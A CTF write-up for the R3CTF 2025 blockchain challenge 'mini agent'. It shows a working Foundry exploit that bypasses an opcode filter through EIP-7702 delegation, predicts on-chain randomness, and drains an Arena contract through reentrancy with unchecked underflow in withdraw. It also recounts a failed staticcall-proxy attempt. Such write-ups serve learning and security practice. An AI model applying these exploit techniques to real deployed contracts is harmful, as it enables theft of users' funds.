---
title: "Blockchain - mini agent - R3CTF 2025"
date: "2025-07-21"
excerpt: "Writeup of the blockchain challenge mini agent from R3CTF 2025"
tags: ["blockchain"]
author: "Ectario"
---
## Intro

> (sad) Note: I didn't solve the chall in time :(

## Presenting the challenge

### Deployment and win condition

A freshly deployed `Challenge` pours 500 ETH into a brand-new `Arena`, keeps 10 ETH for itself, sends the rest to an admin EOA named `system`, then hands arena ownership to that same address.
The solver’s job (which only has 8 ether) is dead simple: finish a transaction with more than 500 ETH on your EOA so this check flips true:

```solidity
return address(msg.sender).balance > 500 ether;
```

### Challenge overview

`Arena` pretends to be an ERC-20 bank fused with a "battle-your-pigs" minigame. Players deposit ether, register a tiny agent contract, claim three pigs (wayyy weaker than the opponent), then challenge opponents for wagers. Combat logic leans on an attached `Randomness` contract, and just about every money-moving path funnels through `Arena`.

## Interesting points

### Randomness

Anyone can poke the RNG through a public `random()` that mutates the internal seed:

```solidity
function random() external returns (uint256) {
    seed = uint256(
        keccak256(
            abi.encodePacked(
                block.prevrandao,
                msg.sender,
                seed
            )
        )
    );
    return seed;
}
```

Because the caller address is mixed into the hash, using this function from different senders scrambles the seed on demand. No fee, no rate-limit, and the battle engine later uses `randomness.random()` for damage rolls.

### Arena: the jail

Registering as a player costs one ether and your wallet has to look like a real EOA:

```solidity
require(tx.origin == msg.sender, "No call");
require(msg.sender.code.length == 0, "No contract");
```

Your battle bot is a separate contract, but its runtime must satisfy several rules:

* bytecode length under 100 bytes
* must not contain following opcode bytes

```
    0xf0    CREATE
    0xf1    CALL
    0xf2    CALLCODE
    0xf4    DELEGATECALL
    0xf5    CREATE2
    0xff    SELFDESTRUCT
```

If any forbidden byte shows up the whole registration reverts with `Do yourself`.

### Arena: withdraw reentrancy with a gas tripwire

Here is the cash-out path, note the unchecked math comment:

```solidity
function withdraw(uint amount) public {
    require(balanceOf[msg.sender] >= amount, "Too low");
    require(amount >= 10 ether, "So little");
    require(tx.origin == msg.sender, "No call");

    payable(msg.sender).call{value: amount, gas: 5000}("");
    unchecked {                      // math left unchecked on purpose
        balanceOf[msg.sender] -= amount;
    }
}
```

Observations worth flagging:

* Only EOAs can call it (`tx.origin` guard).
* Anything below 10 ether is flat-rejected, hinting the author expects big numbers.
* The transfer forwards a hard-capped 5 000 gas, usually enough to block storage writes in a fallback.
* The state update is delayed *and* wrapped in `unchecked`, meaning underflows won’t revert.
* Several other functions (`deposit`, `transfer`, `transferFrom`) are also sprinkled with `unchecked` blocks even when safety isn’t a concern, which feels odd.

Those quirks make `withdraw` the most tempting place to poke around.

## First idea: "Static-call proxy? sounds cool"

I spent a solid chunk of the CTF chasing what looked like a clean bypass for the agent jail (needed to gather more than 10 ether and use withdraw method).
The thought process:

* `register` only inspects the **runtime** of the agent you submit
    * must be `< 100` bytes
    * must not contain the bad opcodes `F0 F1 F2 F4 F5 FF`

* `staticcall` **is not banned** and it doesn’t care about the code size of the target contract.
* If my tiny agent did nothing but forward its calldata to a beefy implementation with `staticcall`, I could keep the agent small and still run serious logic.

Below is the Yul blob I compiled for the proxy. It weighs in at 49 bytes, passes the opcode filter, and simply pipes every call to an external implementation address hard-coded at deploy time.

```yul
object "AgentProxy" {
  code {
    datacopy(0, dataoffset("runtime"), datasize("runtime"))
    return(0, datasize("runtime"))
  }

  object "runtime" {
    code {
      // to change with our true addr impl
      let impl := 0x0000000000000000000000001234567890abcdef1234567890abcdef12345678

      // copy full calldata -> mem[0..calldatasize)
      let cdsz := calldatasize()
      calldatacopy(0, 0, cdsz)

      // STATICCALL to Impl with that buffer
      pop(staticcall(gas(), impl, 0, cdsz, 0, 0))

      // bubble up return data
      returndatacopy(0, 0, returndatasize())
      return(0, returndatasize())
    }
  }
}
```

Gettin' the bytecode: `solc MyAgent.yul --optimize --optimize-yul --strict-assembly`

### Where it blew up

Static calls are read-only by definition. The moment my implementation tried to touch storage the EVM screamed `StateChangeDuringStaticCall` and reverted (and thus, can't call the `.random()` from `Randomness`). This is the unit test I wrote, it's kinda explicit:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";

contract RandomTest {
    uint r = 10;
    function very_random_value() external returns (uint256) {
        r += 1;
        return r;
    }
}

contract Impl {

    function test_no_pure_view(address randomizer) public returns (uint256) {
        return RandomTest(randomizer).very_random_value();
    }

    function ping() external pure returns (uint256) {
        return 42;
    }

    function tick(uint256 a, uint256 b) external pure returns (uint256, uint256, uint256) {
        return (a + 1, b + 1, 42);
    }
}


contract ProxyTest is Test {
    function test_ProxyDelegation() external {
        Impl impl = new Impl();
        console.log("Implementation contract deployed at:", address(impl));

        bytes memory proxyBytecode = abi.encodePacked(
            hex"602780600a5f395ff3fe365f80375f80368173",
            bytes20(address(impl)),
            hex"5afa503d5f803e3d5ff3"
        );
        
        console.log("Proxy bytecode length:", proxyBytecode.length);
        assertTrue(proxyBytecode.length < 100, "Bytecode should be under 100 bytes");

        address proxyAddress;
        assembly {
            // create(value, offset, size)
            proxyAddress := create(0, add(proxyBytecode, 0x20), mload(proxyBytecode))
        }
        require(proxyAddress != address(0), "Proxy deployment failed");
        console.log("Proxy contract deployed at:", proxyAddress);

        (bool success, bytes memory result) = proxyAddress.staticcall(
            abi.encodeWithSelector(Impl.ping.selector)
        );
        require(success, "staticcall to ping() failed");
        assertEq(abi.decode(result, (uint256)), 42, "Returned value from ping() is incorrect");
        console.log("ping() via proxy returned:", abi.decode(result, (uint256)));
    }

    function test_tickDelegation() public {
        Impl impl = new Impl();

        bytes memory proxyBytecode = abi.encodePacked(
            hex"602780600a5f395ff3fe365f80375f80368173",
            bytes20(address(impl)),
            hex"5afa503d5f803e3d5ff3"
        );
        address proxy;
        assembly {
            proxy := create(0, add(proxyBytecode, 0x20), mload(proxyBytecode))
            if iszero(proxy) { revert(0, 0) }
        }

        (bool ok, bytes memory res) = proxy.staticcall(
            abi.encodeWithSelector(Impl.tick.selector, 10, 20)
        );
        require(ok, "tick staticcall failed");

        (uint256 a1, uint256 b1, uint256 pr) =
            abi.decode(res, (uint256, uint256, uint256));
        assertEq(a1, 11, "fromWhich wrong");
        assertEq(b1, 21, "toWhich wrong");
        assertEq(pr, 42, "pr wrong");
    }

    function test_call_and_storage_modified() public {
        Impl impl = new Impl();
        RandomTest randomizer = new RandomTest();

        bytes memory proxyBytecode = abi.encodePacked(
            hex"602780600a5f395ff3fe365f80375f80368173",
            bytes20(address(impl)),
            hex"5afa503d5f803e3d5ff3"
        );
        address proxy;
        assembly {
            proxy := create(0, add(proxyBytecode, 0x20), mload(proxyBytecode))
            if iszero(proxy) { revert(0, 0) }
        }

        (bool ok, bytes memory res) = proxy.staticcall(
            abi.encodeWithSelector(Impl.test_no_pure_view.selector, address(randomizer))
        );
        require(ok, "randomizer staticcall failed");

        (uint256 r) =
            abi.decode(res, (uint256));
        assertEq(r, 11, "randomizer value wrong");
    }
}
```


```sh
Ran 3 tests for test/ProxyAgent.t.sol:ProxyTest
[PASS] test_ProxyDelegation() (gas: 269928)
Logs:
  Implementation contract deployed at: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
  Proxy bytecode length: 49
  Proxy contract deployed at: 0x2e234DAe75C793f67A35089C9d99245E1C58470b
  ping() via proxy returned: 42

[PASS] test_tickDelegation() (gas: 266284)

[FAIL: EvmError: Revert] test_call_and_storage_modified() (gas: 1024189721)
Traces:
  [1024189721] ProxyTest::test_call_and_storage_modified()
    ├─ [184424] → new Impl@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
    │   └─ ← [Return] 921 bytes of code
    ├─ [79408] → new RandomTest@0x2e234DAe75C793f67A35089C9d99245E1C58470b
    │   └─ ← [Return] 286 bytes of code
    ├─ [7828] → new <unknown>@0xF62849F9A0B5Bf2913b396098F7c7019b51A820a
    │   └─ ← [Return] 39 bytes of code
    ├─ [1023819854] 0xF62849F9A0B5Bf2913b396098F7c7019b51A820a::test_no_pure_view(RandomTest: [0x2e234DAe75C793f67A35089C9d99245E1C58470b]) [staticcall]
    │   ├─ [1023819701] Impl::test_no_pure_view(RandomTest: [0x2e234DAe75C793f67A35089C9d99245E1C58470b]) [staticcall]
    │   │   ├─ [422] RandomTest::very_random_value() --> TRY TO CHANGE STORAGE
    │   │   │   └─ ← [StateChangeDuringStaticCall] EvmError: StateChangeDuringStaticCall -> SCREAM THAT I CAN NOT DO THAT
    │   │   └─ ← [Revert] EvmError: Revert
    │   └─ ← [Return]
    └─ ← [Revert] EvmError: Revert
Suite result: FAILED. 2 passed; 1 failed; 0 skipped; finished in 1.03ms (948.20µs CPU time)

Ran 1 test suite in 11.82ms (1.03ms CPU time): 2 tests passed, 1 failed, 0 skipped (3 total tests)

Failing tests:
Encountered 1 failing test in test/ProxyAgent.t.sol:ProxyTest
[FAIL: EvmError: Revert] test_call_and_storage_modified() (gas: 1024189721)
```

In other words: yes, the proxy compiles, deploys, and answers pure/view queries, but it can’t mutate anything, which kills the whole "update seed" plan. Rabbit hole closed, back to the drawing board.

> **Side attempt that went nowhere:**
>
> At one point, I tried hand-rolling a bit different agent (still in raw Yul): a micro-proxy that routes every call through `staticcall`, **except** when the selector is `acceptBattle()`.
> The plan was:
>
> * keep the runtime under 100 bytes so the jail smiles
> * let `staticcall` handle `tick` invocations (cheap, read-only)
> * switch to a normal `call` only for `acceptBattle`, grab the fresh seed from `Randomness.random()`, then pre-compute every future roll and use it during each `tick`.
>
> But for the last point (and because of the jail with `call`), I also explored some niche strategies to sneak around the jail:
> 
> * **self-mutation**: crafting a deploy-time blob that mutates part of its runtime (e.g., storing constants or logic only after deployment). But since `extcodecopy` snapshots the post-deployment bytecode, mutation wouldn't help and you'd still get flagged based on the final form.
> 
> * **dead code jump trick**: I thought about stashing illegal opcodes like `CALL` in a part of the bytecode that execution would never touch unless a conditional `JUMP` triggered it. Unfortunately, `register()` doesn’t simulate execution, it reads the entire code byte-by-byte and filters on the raw bytes. So even unreachable instructions get you disqualified.
> 
> At the end of the day, every detour like that just ran into the same wall: **jail looks at the full bytecode, not the control flow.** After too many hours of bytecode-optimized contortions, I've started to think differently about the reentrancy, but got out of time.

## Real idea: knitting every bug together

I never got this chain to work during the live CTF (since I was still lost in the static-call rabbit hole) but the post-mortem PoC shows how the pieces really fit.

### EIP-7702 (introduced by Pectra hardfork) delegation on a testnet stopwatch

Foundry’s `vm.signDelegation + vm.attachDelegation` pair is a one-shot simulation of the 7702 flow.
*The same two calls could be reproduced on-chain by submitting an **Intent** tx, but cheat-codes are faster for local PoC.*

* Agent side
    * An off-line key signs a delegation that lets `MyAgent` run whenever that EOA sends a tx. (But we need to take care that this implementation's **address** doesn't contains byte excluded by the Jail, since following [7702 eip](https://eips.ethereum.org/EIPS/eip-7702#abstract) it does have the implementation address in the bytecode `For each tuple, a delegation indicator (0xef0100 || address) is written to the authorizing account’s code.`).
    * This keeps `tx.origin == msg.sender` true while still giving us contract logic during battles.

* Player side
    * The player’s own EOA signs a second delegation pointing to `MyEOAImplementation`, the contract that will warm the slot and run the re-entrancy.

```solidity
Vm.SignedDelegation memory d1 = vm.signDelegation(agentImpl, agentPk);
vm.attachDelegation(d1);

Vm.SignedDelegation memory d2 = vm.signDelegation(address(eoaImpl), playerPk);
vm.attachDelegation(d2);
```

### Basic seed oracle

`Randomness.random()` mutates the seed and returns the new value:

```solidity
seed = keccak256(block.prevrandao, msg.sender, seed);
```

Calling it once from inside `MyAgent.tick()` gives the *current* seed.
The agent then performs the exact same hash locally, predicting the number `Arena` will fetch on the next line. No guesswork, no toilet-paper brute-force, just one read and one deterministic hash.

```solidity
uint256 next = uint256(
    keccak256(block.prevrandao, address(msg.sender), seed)
) % 100;
```

Knowing next `r` value allows the bot to predict and be 100% sure of getting the boost, thus tilting the fight.

### Warming `balanceOf[player]`

Gas math under https://github.com/ethereum/EIPs/blob/master/EIPS/eip-2929.md:

| operation | cold | warm                   |
| --------- | ---- | ---------------------- |
| `SLOAD`   | 2100 | 100                    |
| `SSTORE`  | 5000 | 2900                   |

5000 gas is *barely* enough for one warm `SSTORE`, one warm `SLOAD` plus a bit of overhead, but never for the cold versions. A single preliminary transfer does the trick:

```solidity
Arena(arena).transfer(address(0), 1);   // costs ~(2100 + 2*5000) but warming the slots (both for 0 balance and our balance)
```

That first call happens **before** we enter `withdraw`, so when the fallback fires the slot is already in the EVM’s access-list. Inside the 5000-gas stipend we can afford a second `transfer` because the expensive cold surcharge is gone.

### Re-entrancy and unchecked math

`withdraw`:

```solidity
payable(msg.sender).call{value: amount, gas: 5000}("");
unchecked { balanceOf[msg.sender] -= amount; }
```

Sequence of events:

1. `withdraw` sees `balanceOf[player]` high enough, sends `amount` ether and only <5000 gas (explained in previous point).
2. Fallback triggers `transfer(address(0),1)` which **reduces** our arena balance by one while still inside the external call (both address 0 and our balance slots are warmed).
3. Control returns to `withdraw`; it executes the unchecked subtraction using the *already-decremented* balance.
4. Result underflows to `(balance - 1) - amount`, because we asked `amount` with `balance`. Our balance is now effectively max-uint.
5. A second call to `withdraw` with `address(arena).balance` as the parameter empties the contract, easily pushing the EOA over the 500-ETH win line.

### Putting it all together

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console, Vm} from "forge-std/Test.sol";
import "../src/Challenge.sol";
import "../src/Arena.sol";

contract Exploit is Test {
    Challenge public challenge;
    Arena public arena;
    Randomness public randomness;

    address system = makeAddr("system");
    address player;
    uint256 playerPk;

    uint256 internal _nonce;

    modifier runAsPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
    }

    modifier solved() {
        _;
        _isSolved();
    }

    /**
     * setup chall' locally
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");

        startHoax(system);
        payable(player).transfer(8 ether);
        challenge = new Challenge{value: 500 ether}();
        arena = challenge.arena();
        vm.stopPrank();
    }

    function test_runSploit() external solved {
        step1(); // player
        _doBattle(); // server role
        step2(); // player
    }

    function step1() internal runAsPlayer {
        uint256 agentPk = 0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d;

        // sending some eth for gas usage of our agent
        (bool success, ) = vm.addr(agentPk).call{value: 0.1 ether}("");
        require(success, "sending ether to our agent failed");

        bytes memory code = type(MyAgent).creationCode;
        address agentImplementation;

        uint256 i = 0;
        while (true) {
            assembly {
                agentImplementation := create2(
                    0,
                    add(code, 0x20),
                    mload(code),
                    i
                )
            }
            bytes20 _test = (bytes20(address(agentImplementation)));
            if (jailbreaker(_test)) {
                break;
            }
            i++;
        }

        // Agent signs a delegation allowing `agentImplementation` to execute transactions on its behalf.
        Vm.SignedDelegation memory signedDelegation = vm.signDelegation(
            address(agentImplementation),
            agentPk
        );
        vm.attachDelegation(signedDelegation);

        // now lets register user and ask for bloooood
        arena.deposit{value: 7 ether}();
        arena.register(vm.addr(agentPk));
        arena.claimPig();
        arena.claimPig();
        arena.claimPig();
        arena.requestBattle(address(challenge), 5.9 ether); // 5.9 because if we win we've enough to withdraw (> 10 ether in total), and that let us some wei for gas usage
    }

    function step2() internal runAsPlayer {
        MyEOAImplementation eoaImplem = new MyEOAImplementation();
        // We signs a delegation allowing a contract to execute transactions on our behalf (allowing reentrancy with an EOA).
        Vm.SignedDelegation memory signedDelegation = vm.signDelegation(
            address(eoaImplem),
            playerPk
        );
        vm.attachDelegation(signedDelegation);
        (bool success,) = address(player).call(
            abi.encodeWithSignature("gogogo(address)", address(arena))
        );
        require(success, "Reentrancy failed :(");

        console.log("player arena.balance:", arena.balanceOf(player));
        console.log("chal arena.balance:", arena.balanceOf(address(challenge)));
        console.log("player balance ether:", player.balance);
        console.log(challenge.isSolved());
    }

    function jailbreaker(bytes20 data) internal pure returns (bool) {
        for (uint256 i = 0; i < data.length; i++) {
            uint8 b = uint8(data[i]);
            if (
                (b >= 0xf0 && b <= 0xf2) ||
                (b >= 0xf4 && b <= 0xf5) ||
                (b == 0xff)
            ) {
                return false;
            }
        }
        return true;
    }

    function _doBattle() internal {
        vm.recordLogs();
        _mimicServerSideBattle();
        Vm.Log[] memory logs = vm.getRecordedLogs();
        for (uint i = 0; i < logs.length; i++) {
            Vm.Log memory log = logs[i];
            address player1 = address(uint160(uint256(log.topics[1])));
            address player2 = address(uint160(uint256(log.topics[2])));
            (uint256 winner, uint256 wager) = abi.decode(
                log.data,
                (uint256, uint256)
            );
            console.log("BattleResult:");
            console.log(" - player1:", player1);
            console.log(" - player2:", player2);
            console.log(" - winner: ", winner == 0 ? player1 : player2);
            console.log(" - wager:  ", wager);
        }
    }

    function _isSolved() internal view {
        assertTrue(challenge.isSolved());
    }

    // fake random just for the local tests purpose
    function _rand() internal returns (uint256) {
        _nonce++;
        return
            uint256(
                keccak256(
                    abi.encodePacked(block.timestamp, block.prevrandao, _nonce)
                )
            );
    }

    function _mimicServerSideBattle() internal {
        vm.startPrank(system, system);
        challenge.arena().processBattle(_rand());
        vm.stopPrank();
    }
}

contract MyAgent {
    function acceptBattle(address, uint256) external pure returns (bool) {
        return true;
    }

    function tick(
        address,
        uint256,
        uint256,
        Arena.Pig[] memory fromPigs,
        Arena.Pig[] memory toPigs
    ) external returns (uint256 fromWhich, uint256 toWhich, uint256 r) {
        fromWhich = 0;
        toWhich = 0;
        uint256 maxAttack = 0;
        for (uint256 i = 0; i < fromPigs.length; i++) {
            if (fromPigs[i].health > 0 && fromPigs[i].attack > maxAttack) {
                maxAttack = fromPigs[i].attack;
                fromWhich = i;
            }
        }
        maxAttack = 0;
        for (uint256 i = 0; i < toPigs.length; i++) {
            if (toPigs[i].health > 0 && toPigs[i].attack > maxAttack) {
                maxAttack = toPigs[i].attack;
                toWhich = i;
            }
        }
        uint256 seed = Randomness(Arena(msg.sender).randomness()).random();
        r =
            uint256(
                keccak256(
                    abi.encodePacked(
                        uint256(block.prevrandao),
                        address(msg.sender),
                        seed
                    )
                )
            ) %
            100; // next value pre-calculated
    }
}

contract MyEOAImplementation {
    function gogogo(address arena) external {
        Arena(arena).transfer(address(0), 1); // to warm up the storage slot following https://github.com/ethereum/EIPs/blob/master/EIPS/eip-2929.md
        Arena(arena).withdraw(Arena(arena).balanceOf(address(this)));
        Arena(arena).withdraw(address(arena).balance);
    }

    receive() external payable {
        assembly {
            // » chisel  
            // ➜ keccak256("transfer(address,uint256)") // selector calculation
            // Type: bytes32
            // └ Data: 0xa9059cbb2ab09eb219583f4a59a5d0623ade346d962bcd4e46b11da047c9049b
            // keepin' only 4bytes: 0xa9059cbb2ab09eb219583f4a59a5d0623ade346d962bcd4e46b11da047c9049b -> 0xa9059cbb00000000000000000000000000000000000000000000000000000000
            mstore(
                0x00,
                0xa9059cbb00000000000000000000000000000000000000000000000000000000
            ) 
            mstore(0x24, 1)
            pop(call(
                gas(),
                0xb4f257A619B2cc621326d51682a88d00bd5eBB07, // arena
                0,
                0x00,
                0x44,
                0x00,
                0x00
            ))
        }
    }
}
```

The PoC test suite shows the balance rocketing past 500 ETH and the flag flipping, all while staying inside the jail’s byte-limit and opcode filter thanks to the 7702 delegation.  

Ectario
